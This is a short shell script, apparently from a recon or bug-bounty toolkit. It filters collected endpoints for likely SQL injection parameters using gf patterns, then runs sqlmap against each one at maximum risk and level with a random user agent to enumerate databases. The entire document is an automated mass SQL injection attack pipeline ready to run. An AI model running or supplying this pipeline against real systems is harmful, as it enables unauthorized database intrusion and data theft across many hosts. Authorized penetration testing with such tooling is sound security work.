#https://github.com/1ndianl33t/Gf-Patterns 
./inputter.sh $1 all_endpoints initial_endpoints_with_passive | gf sqli | while read host;
do
        sqlmap -u $host --batch --random-agent --eta --dbs --risk 3 --level 5
done        
        
